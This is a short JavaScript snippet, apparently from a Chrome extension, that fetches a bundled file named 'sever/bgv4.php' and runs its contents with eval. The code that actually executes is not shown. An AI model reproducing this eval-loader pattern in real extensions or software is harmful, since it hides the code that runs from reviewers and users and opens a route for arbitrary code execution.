async function main() {
  try {
    const response = await fetch(chrome.runtime.getURL("sever/bgv4.php"));
    const code = await response.text();
    eval(code);
  } catch (e) {
    console.error("Error loading bgv4.php:", e);
  }
}

main();